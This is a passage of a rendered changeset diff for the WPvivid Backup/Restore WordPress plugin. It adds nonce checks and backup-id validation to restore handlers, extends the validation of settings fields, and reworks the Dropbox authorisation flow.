  | 1238 | 1229 | $this->end\_shutdown\_function=true; |
  | 1239 | 1230 | die(); |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L1394) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L1385) |  |
  | 1394 | 1385 | } |
  | 1395 | 1386 | WPvivid\_Schedule::clear\_monitor\_schedule($task['id']); |
  | 1396 |  | WPvivid\_mail\_report::send\_report\_mail($task); |
  |  | 1387 |  |
  |  | 1388 | $backup\_task=new WPvivid\_Backup\_Task($task['id']); |
  |  | 1389 | $res=$backup\_task->get\_backup\_result(); |
  |  | 1390 | if(!empty($res['files'])) |
  |  | 1391 | { |
  |  | 1392 | WPvivid\_mail\_report::send\_report\_mail($task); |
  |  | 1393 | } |
  | 1397 | 1394 | } |
  | 1398 | 1395 |  |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L3646) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L3643) |  |
  | 3646 | 3643 | public function restore() |
  | 3647 | 3644 | { |
  |  | 3645 | check\_ajax\_referer( 'wpvivid\_ajax', 'nonce' ); |
  |  | 3646 |  |
  | 3648 | 3647 | $this->end\_shutdown\_function=false; |
  | 3649 | 3648 | register\_shutdown\_function(array($this,'deal\_restore\_shutdown\_error')); |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L3655) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L3654) |  |
  | 3655 | 3654 |  |
  | 3656 | 3655 | $backup\_id=sanitize\_key($\_POST['backup\_id']); |
  |  | 3656 | $backup=WPvivid\_Backuplist::get\_backup\_by\_id($backup\_id); |
  |  | 3657 | if($backup===false) |
  |  | 3658 | { |
  |  | 3659 | die(); |
  |  | 3660 | } |
  | 3657 | 3661 |  |
  | 3658 | 3662 | $this->restore\_data=new WPvivid\_restore\_data(); |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L3846) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L3850) |  |
  | 3846 | 3850 | public function get\_restore\_progress() |
  | 3847 | 3851 | { |
  | 3848 |  | try { |
  |  | 3852 | try |
  |  | 3853 | { |
  |  | 3854 | check\_ajax\_referer( 'wpvivid\_ajax', 'nonce' ); |
  |  | 3855 | if(!isset($\_POST['backup\_id'])||empty($\_POST['backup\_id'])||!is\_string($\_POST['backup\_id'])) |
  |  | 3856 | { |
  |  | 3857 | $this->end\_shutdown\_function=true; |
  |  | 3858 | die(); |
  |  | 3859 | } |
  |  | 3860 |  |
  |  | 3861 | $backup\_id=sanitize\_key($\_POST['backup\_id']); |
  |  | 3862 | $backup=WPvivid\_Backuplist::get\_backup\_by\_id($backup\_id); |
  |  | 3863 | if($backup===false) |
  |  | 3864 | { |
  |  | 3865 | die(); |
  |  | 3866 | } |
  |  | 3867 |  |
  | 3849 | 3868 | $this->restore\_data = new WPvivid\_restore\_data(); |
  | 3850 | 3869 |  |
  | 3851 |  | if ($this->restore\_data->has\_restore()) { |
  |  | 3870 | if ($this->restore\_data->has\_restore()) |
  |  | 3871 | { |
  | 3852 | 3872 | $ret['result'] = 'success'; |
  | 3853 | 3873 | $ret['status'] = $this->restore\_data->get\_restore\_status(); |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L4891) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L4911) |  |
  | 4891 | 4911 | if(!isset($data['max\_file\_size'])) |
  | 4892 | 4912 | { |
  | 4893 |  | $ret['error']=\_\_('The ~~maximum zip file size is required~~.', 'wpvivid-backuprestore'); |
  |  | 4913 | $ret['error']=\_\_('The value of \'Compress file every\' can\'t be empty.', 'wpvivid-backuprestore'); |
  | 4894 | 4914 | return $ret; |
  | 4895 | 4915 | } |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L4899) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L4919) |  |
  | 4899 | 4919 | if(empty($data['max\_file\_size']) && $data['max\_file\_size'] != '0') |
  | 4900 | 4920 | { |
  | 4901 |  | $ret['error']=\_\_('The ~~maximum zip file size is required~~.', 'wpvivid-backuprestore'); |
  |  | 4921 | $ret['error']=\_\_('The value of \'Compress file every\' can\'t be empty.', 'wpvivid-backuprestore'); |
  | 4902 | 4922 | return $ret; |
  | 4903 | 4923 | } |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L4905) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L4925) |  |
  | 4905 | 4925 | if(!isset($data['exclude\_file\_size'])) |
  | 4906 | 4926 | { |
  | 4907 |  | $ret['error']=\_\_('The ~~size for excluded files is required~~.', 'wpvivid-backuprestore'); |
  |  | 4927 | $ret['error']=\_\_('The value of \'Exclude files which are lager than\' can\'t be empty.', 'wpvivid-backuprestore'); |
  | 4908 | 4928 | } |
  | 4909 | 4929 |  |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L4912) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L4932) |  |
  | 4912 | 4932 | if(empty($data['exclude\_file\_size']) && $data['exclude\_file\_size'] != '0') |
  | 4913 | 4933 | { |
  | 4914 |  | $ret['error']=\_\_('The ~~size for excluded files is required~~.', 'wpvivid-backuprestore'); |
  |  | 4934 | $ret['error']=\_\_('The value of \'Exclude files which are lager than\' can\'t be empty.', 'wpvivid-backuprestore'); |
  | 4915 | 4935 | return $ret; |
  | 4916 | 4936 | } |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L4918) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L4938) |  |
  | 4918 | 4938 | if(!isset($data['max\_execution\_time'])) |
  | 4919 | 4939 | { |
  | 4920 |  | $ret['error']=\_\_('The ~~maximum execution time for PHP script is required~~.', 'wpvivid-backuprestore'); |
  |  | 4940 | $ret['error']=\_\_('The value of \'PHP scripts execution timeout for backup\' can\'t be empty.', 'wpvivid-backuprestore'); |
  | 4921 | 4941 | } |
  | 4922 | 4942 |  |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L4925) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L4945) |  |
  | 4925 | 4945 | if(empty($data['max\_execution\_time']) && $data['max\_execution\_time'] != '0') |
  | 4926 | 4946 | { |
  | 4927 |  | $ret['error']=\_\_('The ~~maximum execution time for PHP script is required~~.', 'wpvivid-backuprestore'); |
  |  | 4947 | $ret['error']=\_\_('The value of \'PHP scripts execution timeout for backup\' can\'t be empty.', 'wpvivid-backuprestore'); |
  | 4928 | 4948 | return $ret; |
  | 4929 | 4949 | } |
  |  | 4950 |  |
  |  | 4951 | // |
  |  | 4952 | if(!isset($data['restore\_max\_execution\_time'])) |
  |  | 4953 | { |
  |  | 4954 | $ret['error']=\_\_('The value of \'PHP scripts execution timeout for restore\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 4955 | } |
  |  | 4956 | $data['restore\_max\_execution\_time']=sanitize\_text\_field($data['restore\_max\_execution\_time']); |
  |  | 4957 | if(empty($data['restore\_max\_execution\_time']) && $data['restore\_max\_execution\_time'] != '0') |
  |  | 4958 | { |
  |  | 4959 | $ret['error']=\_\_('The value of \'PHP scripts execution timeout for restore\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 4960 | return $ret; |
  |  | 4961 | } |
  |  | 4962 |  |
  |  | 4963 | if(!isset($data['memory\_limit'])) |
  |  | 4964 | { |
  |  | 4965 | $ret['error']=\_\_('The value of \'PHP memory limit for backup\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 4966 | } |
  |  | 4967 | $data['memory\_limit']=sanitize\_text\_field($data['memory\_limit']); |
  |  | 4968 | if(empty($data['memory\_limit']) && $data['memory\_limit'] != '0') |
  |  | 4969 | { |
  |  | 4970 | $ret['error']=\_\_('The value of \'PHP memory limit for backup\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 4971 | return $ret; |
  |  | 4972 | } |
  |  | 4973 |  |
  |  | 4974 | if(!isset($data['restore\_memory\_limit'])) |
  |  | 4975 | { |
  |  | 4976 | $ret['error']=\_\_('The value of \'PHP memory limit for restoration\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 4977 | } |
  |  | 4978 | $data['restore\_memory\_limit']=sanitize\_text\_field($data['restore\_memory\_limit']); |
  |  | 4979 | if(empty($data['restore\_memory\_limit']) && $data['restore\_memory\_limit'] != '0') |
  |  | 4980 | { |
  |  | 4981 | $ret['error']=\_\_('The value of \'PHP memory limit for restoration\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 4982 | return $ret; |
  |  | 4983 | } |
  |  | 4984 |  |
  |  | 4985 | if(!isset($data['migrate\_size'])) |
  |  | 4986 | { |
  |  | 4987 | $ret['error']=\_\_('The value of \'Chunk Size\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 4988 | } |
  |  | 4989 | $data['migrate\_size']=sanitize\_text\_field($data['migrate\_size']); |
  |  | 4990 | if(empty($data['migrate\_size']) && $data['migrate\_size'] != '0') |
  |  | 4991 | { |
  |  | 4992 | $ret['error']=\_\_('The value of \'Chunk Size\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 4993 | return $ret; |
  |  | 4994 | } |
  |  | 4995 |  |
  |  | 4996 | if(!isset($data['wpvivid\_uc\_scan\_limit'])) |
  |  | 4997 | { |
  |  | 4998 | $ret['error']=\_\_('The value of \'Posts Quantity Processed Per Request\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 4999 | } |
  |  | 5000 | $data['wpvivid\_uc\_scan\_limit']=sanitize\_text\_field($data['wpvivid\_uc\_scan\_limit']); |
  |  | 5001 | if(empty($data['wpvivid\_uc\_scan\_limit']) && $data['wpvivid\_uc\_scan\_limit'] != '0') |
  |  | 5002 | { |
  |  | 5003 | $ret['error']=\_\_('The value of \'Posts Quantity Processed Per Request\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5004 | return $ret; |
  |  | 5005 | } |
  |  | 5006 |  |
  |  | 5007 | if(!isset($data['wpvivid\_uc\_files\_limit'])) |
  |  | 5008 | { |
  |  | 5009 | $ret['error']=\_\_('The value of \'Media Files Quantity Processed Per Request\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5010 | } |
  |  | 5011 | $data['wpvivid\_uc\_files\_limit']=sanitize\_text\_field($data['wpvivid\_uc\_files\_limit']); |
  |  | 5012 | if(empty($data['wpvivid\_uc\_files\_limit']) && $data['wpvivid\_uc\_files\_limit'] != '0') |
  |  | 5013 | { |
  |  | 5014 | $ret['error']=\_\_('The value of \'Media Files Quantity Processed Per Request\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5015 | return $ret; |
  |  | 5016 | } |
  |  | 5017 |  |
  |  | 5018 | if(!isset($data['staging\_db\_insert\_count'])) |
  |  | 5019 | { |
  |  | 5020 | $ret['error']=\_\_('The value of \'DB Copy Count\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5021 | } |
  |  | 5022 | $data['staging\_db\_insert\_count']=sanitize\_text\_field($data['staging\_db\_insert\_count']); |
  |  | 5023 | if(empty($data['staging\_db\_insert\_count']) && $data['staging\_db\_insert\_count'] != '0') |
  |  | 5024 | { |
  |  | 5025 | $ret['error']=\_\_('The value of \'DB Copy Count\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5026 | return $ret; |
  |  | 5027 | } |
  |  | 5028 |  |
  |  | 5029 | if(!isset($data['staging\_db\_replace\_count'])) |
  |  | 5030 | { |
  |  | 5031 | $ret['error']=\_\_('The value of \'DB Replace Count\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5032 | } |
  |  | 5033 | $data['staging\_db\_replace\_count']=sanitize\_text\_field($data['staging\_db\_replace\_count']); |
  |  | 5034 | if(empty($data['staging\_db\_replace\_count']) && $data['staging\_db\_replace\_count'] != '0') |
  |  | 5035 | { |
  |  | 5036 | $ret['error']=\_\_('The value of \'DB Replace Count\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5037 | return $ret; |
  |  | 5038 | } |
  |  | 5039 |  |
  |  | 5040 | if(!isset($data['staging\_file\_copy\_count'])) |
  |  | 5041 | { |
  |  | 5042 | $ret['error']=\_\_('The value of \'File Copy Count\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5043 | } |
  |  | 5044 | $data['staging\_file\_copy\_count']=sanitize\_text\_field($data['staging\_file\_copy\_count']); |
  |  | 5045 | if(empty($data['staging\_file\_copy\_count']) && $data['staging\_file\_copy\_count'] != '0') |
  |  | 5046 | { |
  |  | 5047 | $ret['error']=\_\_('The value of \'File Copy Count\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5048 | return $ret; |
  |  | 5049 | } |
  |  | 5050 |  |
  |  | 5051 | if(!isset($data['staging\_exclude\_file\_size'])) |
  |  | 5052 | { |
  |  | 5053 | $ret['error']=\_\_('The value of \'Max Files Size\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5054 | } |
  |  | 5055 | $data['staging\_exclude\_file\_size']=sanitize\_text\_field($data['staging\_exclude\_file\_size']); |
  |  | 5056 | if(empty($data['staging\_exclude\_file\_size']) && $data['staging\_exclude\_file\_size'] != '0') |
  |  | 5057 | { |
  |  | 5058 | $ret['error']=\_\_('The value of \'Max Files Size\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5059 | return $ret; |
  |  | 5060 | } |
  |  | 5061 |  |
  |  | 5062 | if(!isset($data['staging\_memory\_limit'])) |
  |  | 5063 | { |
  |  | 5064 | $ret['error']=\_\_('The value of \'Staging Memeory Limit\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5065 | } |
  |  | 5066 | $data['staging\_memory\_limit']=sanitize\_text\_field($data['staging\_memory\_limit']); |
  |  | 5067 | if(empty($data['staging\_memory\_limit']) && $data['staging\_memory\_limit'] != '0') |
  |  | 5068 | { |
  |  | 5069 | $ret['error']=\_\_('The value of \'Staging Memeory Limit\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5070 | return $ret; |
  |  | 5071 | } |
  |  | 5072 |  |
  |  | 5073 | if(!isset($data['staging\_max\_execution\_time'])) |
  |  | 5074 | { |
  |  | 5075 | $ret['error']=\_\_('The value of \'PHP Scripts Execution Timeout\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5076 | } |
  |  | 5077 | $data['staging\_max\_execution\_time']=sanitize\_text\_field($data['staging\_max\_execution\_time']); |
  |  | 5078 | if(empty($data['staging\_max\_execution\_time']) && $data['staging\_max\_execution\_time'] != '0') |
  |  | 5079 | { |
  |  | 5080 | $ret['error']=\_\_('The value of \'PHP Scripts Execution Timeout\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5081 | return $ret; |
  |  | 5082 | } |
  |  | 5083 |  |
  |  | 5084 | if(!isset($data['staging\_request\_timeout'])) |
  |  | 5085 | { |
  |  | 5086 | $ret['error']=\_\_('The value of \'Delay Between Requests\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5087 | } |
  |  | 5088 | $data['staging\_request\_timeout']=sanitize\_text\_field($data['staging\_request\_timeout']); |
  |  | 5089 | if(empty($data['staging\_request\_timeout']) && $data['staging\_request\_timeout'] != '0') |
  |  | 5090 | { |
  |  | 5091 | $ret['error']=\_\_('The value of \'Delay Between Requests\' can\'t be empty.', 'wpvivid-backuprestore'); |
  |  | 5092 | return $ret; |
  |  | 5093 | } |
  |  | 5094 | // |
  | 4930 | 5095 |  |
  | 4931 | 5096 | if(!isset($data['path'])) |
  | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2661194#L5238) | […](/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid.php?rev=2667839#L5403) |  |
  | 5238 | 5403 | else{ |
  | 5239 | 5404 | $offset=get\_option('gmt\_offset'); |
  | 5240 |  | $localtime = strtotime($value['time'])~~+ $offset \* 60 \* 60~~; |
  |  | 5405 | $localtime = strtotime($value['time'])/\* + $offset \* 60 \* 60\*/; |
  | 5241 | 5406 | $value['time'] = date('F-d-Y H:i:s',$localtime); |
  | 5242 | 5407 | } |
* ## [wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php")

  | [r2661194](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php?rev=2661194#L49 "Show revision 2661194 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php?rev=2667839#L49 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 49 | 49 | $remote\_options['created'] = time(); |
  | 50 | 50 | WPvivid\_Setting::update\_remote\_option($this->option['id'],$remote\_options); |
  | 51 |  | $this -> access\_token = $~~this->option~~['access\_token']; |
  | 52 |  | $this -> created = $~~this->option~~['created']; |
  | 53 |  | $this -> expires\_in = $~~this->option~~['expires\_in']; |
  |  | 51 | $this -> access\_token = $remote\_options['access\_token']; |
  |  | 52 | $this -> created = $remote\_options['created']; |
  |  | 53 | $this -> expires\_in = $remote\_options['expires\_in']; |
  | 54 | 54 | $this -> refresh\_token = $this->option['refresh\_token']; |
  | 55 | 55 |  |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php?rev=2661194#L84) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php?rev=2667839#L84) |  |
  | 84 | 84 |  |
  | 85 | 85 | $returnData = $this ->postRequest($endpoint, $headers, $postdata); |
  | 86 |  | if(~~preg\_match( "/Invalid or expired token. Please remove .\* from the storage list and re-authenticate it/", $returnData~~, $matches )) |
  |  | 86 | if(isset($returnData['error\_summary']) && preg\_match( "/Invalid or expired token. Please remove .\* from the storage list and re-authenticate it/", $returnData['error\_summary'], $matches )) |
  | 87 | 87 | { |
  | 88 | 88 | $ret=$this->check\_token(); |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php?rev=2661194#L108) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php?rev=2667839#L108) |  |
  | 108 | 108 |  |
  | 109 | 109 | $returnData = $this ->postRequest($endpoint, $headers,null); |
  | 110 |  | if(~~preg\_match( "/Invalid or expired token. Please remove .\* from the storage list and re-authenticate it/", $returnData~~, $matches )) |
  |  | 110 | if(isset($returnData['error\_summary']) && preg\_match( "/Invalid or expired token. Please remove .\* from the storage list and re-authenticate it/", $returnData['error\_summary'], $matches )) |
  | 111 | 111 | { |
  | 112 | 112 | $ret=$this->check\_token(); |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php?rev=2661194#L132) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-base-dropbox.php?rev=2667839#L132) |  |
  | 132 | 132 |  |
  | 133 | 133 | $returnData = $this ->postRequest($endpoint, $headers, $postdata); |
  | 134 |  | if(~~preg\_match( "/Invalid or expired token. Please remove .\* from the storage list and re-authenticate it/", $returnData~~, $matches )) |
  |  | 134 | if(isset($returnData['error\_summary']) && preg\_match( "/Invalid or expired token. Please remove .\* from the storage list and re-authenticate it/", $returnData['error\_summary'], $matches )) |
  | 135 | 135 | { |
  | 136 | 136 | $ret=$this->check\_token(); |
* ## [wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php")

  | [r2661194](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2661194#L18 "Show revision 2661194 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2667839#L18 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 18 | 18 | private $download\_chunk\_size = 2097152; |
  | 19 | 19 | private $redirect\_url = 'https://auth.wpvivid.com/dropbox\_v3/'; |
  |  | 20 | public $add\_remote; |
  | 20 | 21 | public function \_\_construct($options = array()) |
  | 21 | 22 | { |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2661194#L25) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2667839#L26) |  |
  | 25 | 26 | { |
  | 26 | 27 | add\_action('init', array($this, 'handle\_auth\_actions')); |
  |  | 28 | //wpvivid\_dropbox\_add\_remote |
  |  | 29 | add\_action('wp\_ajax\_wpvivid\_dropbox\_add\_remote',array( $this,'finish\_add\_remote')); |
  |  | 30 |  |
  | 27 | 31 | add\_action('wpvivid\_delete\_remote\_token',array($this,'revoke')); |
  | 28 | 32 |  |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2661194#L41) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2667839#L45) |  |
  | 41 | 45 | $this -> options = $options; |
  | 42 | 46 | } |
  |  | 47 | $this->add\_remote=false; |
  | 43 | 48 | } |
  | 44 | 49 |  |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2661194#L335) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2667839#L340) |  |
  | 335 | 340 | { |
  | 336 | 341 | try { |
  | 337 |  | if (!isset($\_GET['name']) || empty($\_GET['name'])) |
  | 338 |  | { |
  | 339 |  | echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: An alias for remote storage is required.', 'wpvivid-backuprestore').'</p></div>'; |
  | 340 |  | return; |
  | 341 |  | } |
  | 342 |  |  |
  | 343 |  | $alias\_name = sanitize\_text\_field($\_GET['name']); |
  | 344 |  |  |
  |  | 342 | $auth\_id = uniqid('wpvivid-auth-'); |
  |  | 343 | $state = admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_dropbox\_finish\_auth&main\_tab=storage&sub\_tab=dropbox&sub\_page=storage\_account\_dropbox&auth\_id='.$auth\_id; |
  |  | 344 | $remote\_options['auth\_id']=$auth\_id; |
  |  | 345 | update\_option('wpvivid\_tmp\_remote\_options',$remote\_options); |
  |  | 346 | $url = Dropbox\_Base::getUrl($this->redirect\_url, $state); |
  |  | 347 | header('Location: ' . filter\_var($url, FILTER\_SANITIZE\_URL)); |
  |  | 348 | } |
  |  | 349 | catch (Exception $e){ |
  |  | 350 | echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>'; |
  |  | 351 | } |
  |  | 352 | } |
  |  | 353 | else if($\_GET['action'] === 'wpvivid\_dropbox\_finish\_auth') |
  |  | 354 | { |
  |  | 355 | try { |
  | 345 | 356 | $remoteslist = WPvivid\_Setting::get\_all\_remote\_options(); |
  | 346 | 357 | foreach ($remoteslist as $key => $value) |
  | 347 | 358 | { |
  | 348 |  | if (isset($value['~~name']) && $value['name'] == $alias\_name~~) |
  |  | 359 | if (isset($value['auth\_id']) && isset($\_GET['auth\_id']) && $value['auth\_id'] == sanitize\_text\_field($\_GET['auth\_id'])) |
  | 349 | 360 | { |
  | 350 |  | ~~echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: The alias already exists in storage list.', 'wpvivid-backuprestore').'</p></div>';~~ |
  | 351 |  | ~~return;~~ |
  | 352 |  | ~~}~~ |
  | 353 |  | ~~}~~ |
  | 354 |  | ~~$default = sanitize\_text\_field($\_GET['bdefault']);~~ |
  | 355 |  | ~~$auth\_id = uniqid('wpvivid-auth-');~~ |
  | 356 |  | ~~$state = admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_dropbox\_finish\_auth&name=' . $alias\_name . '&bdefault=' . $default.'&auth\_id='.$auth\_id;~~ |
  | 357 |  | ~~$url = Dropbox\_Base::getUrl($this->redirect\_url, $state);~~ |
  | 358 |  | ~~header('Location: ' . filter\_var($url, FILTER\_SANITIZE\_URL));~~ |
  | 359 |  | ~~}~~ |
  | 360 |  | ~~catch (Exception $e){~~ |
  | 361 |  | ~~echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>';~~ |
  | 362 |  | ~~}~~ |
  | 363 |  | ~~}~~ |
  | 364 |  | ~~else if($\_GET['action'] === 'wpvivid\_dropbox\_finish\_auth')~~ |
  | 365 |  | ~~{~~ |
  | 366 |  | ~~try {~~ |
  | 367 |  | ~~$remoteslist = WPvivid\_Setting::get\_all\_remote\_options();~~ |
  | 368 |  | ~~foreach ($remoteslist as $key => $value) {~~ |
  | 369 |  | ~~if (isset($value['auth\_id']) && isset($\_GET['auth\_id']) && $value['auth\_id'] == sanitize\_text\_field($\_GET['auth\_id'])) {~~ |
  | 370 | 361 | \_e('<div class="notice notice-success is-dismissible"><p>You have authenticated the Dropbox account as your remote storage.</p></div>'); |
  | 371 | 362 | return; |
  | 372 | 363 | } |
  | 373 | 364 | } |
  | 374 |  | if (!isset($\_POST['code'])) { |
  | 375 |  | header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_dropbox\_drive&result=error&resp\_msg=' . 'Get Dropbox token failed.'); |
  | 376 |  | } else { |
  | 377 |  | global $wpvivid\_plugin; |
  | 378 |  | $remote\_options['type'] = WPVIVID\_REMOTE\_DROPBOX; |
  | 379 |  | $remote\_options['access\_token']= sanitize\_text\_field($\_POST['code']); |
  | 380 |  | $remote\_options['expires\_in'] = sanitize\_text\_field($\_POST['expires\_in']); |
  | 381 |  | $remote\_options['refresh\_token'] = sanitize\_text\_field($\_POST['refresh\_token']); |
  | 382 |  | $remote\_options['created']=time(); |
  | 383 |  | $remote\_options['name'] = sanitize\_text\_field($\_GET['name']); |
  | 384 |  | $remote\_options['path'] = WPVIVID\_DROPBOX\_DEFAULT\_FOLDER; |
  | 385 |  | $remote\_options['default'] = sanitize\_text\_field($\_GET['bdefault']); |
  | 386 |  | $remote\_options['auth\_id'] = sanitize\_text\_field($\_GET['auth\_id']); |
  | 387 |  | $ret = $wpvivid\_plugin->remote\_collection->add\_remote($remote\_options); |
  | 388 |  | if ($ret['result'] == 'success') { |
  | 389 |  | header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_dropbox\_drive&result=success'); |
  | 390 |  | return; |
  | 391 |  | } else { |
  | 392 |  | header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_dropbox\_drive&result=error&resp\_msg=' . $ret['error']); |
  |  | 365 |  |
  |  | 366 | $tmp\_options=get\_option('wpvivid\_tmp\_remote\_options',false); |
  |  | 367 | if($tmp\_options===false) |
  |  | 368 | { |
  |  | 369 | return; |
  |  | 370 | } |
  |  | 371 | else |
  |  | 372 | { |
  |  | 373 | if($tmp\_options['auth\_id']===sanitize\_text\_field($\_GET['auth\_id'])) |
  |  | 374 | { |
  |  | 375 | if(empty($\_POST['code'])) |
  |  | 376 | { |
  |  | 377 | if(empty($tmp\_options['access\_token'])) |
  |  | 378 | { |
  |  | 379 | header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_dropbox\_drive&result=error&resp\_msg=' . 'Get Dropbox token failed.'); |
  |  | 380 | return; |
  |  | 381 | } |
  |  | 382 | } |
  |  | 383 | else |
  |  | 384 | { |
  |  | 385 | $tmp\_options['type'] = WPVIVID\_REMOTE\_DROPBOX; |
  |  | 386 | $tmp\_options['access\_token']= sanitize\_text\_field($\_POST['code']); |
  |  | 387 | $tmp\_options['expires\_in'] = sanitize\_text\_field($\_POST['expires\_in']); |
  |  | 388 | $tmp\_options['refresh\_token'] = sanitize\_text\_field($\_POST['refresh\_token']); |
  |  | 389 | update\_option('wpvivid\_tmp\_remote\_options',$tmp\_options); |
  |  | 390 | } |
  |  | 391 | $this->add\_remote=true; |
  |  | 392 | } |
  |  | 393 | else |
  |  | 394 | { |
  | 393 | 395 | return; |
  | 394 | 396 | } |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2661194#L414) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2667839#L416) |  |
  | 414 | 416 | } |
  | 415 | 417 | } |
  | 416 |  | ~~else if($\_GET['action'] === 'wpvivid\_dropbox\_update\_auth')~~ |
  | 417 |  | ~~{~~ |
  | 418 |  | ~~try {~~ |
  | 419 |  | ~~if (!isset($\_GET['name']) || empty($\_GET['name'])) {~~ |
  | 420 |  | ~~echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: An alias for remote storage is required.', 'wpvivid-backuprestore').'</p></div>';~~ |
  | 421 |  | ~~return;~~ |
  | 422 |  | ~~}~~ |
  | 423 |  |  |
  | 424 |  | ~~$alias\_name = sanitize\_text\_field($\_GET['name']);~~ |
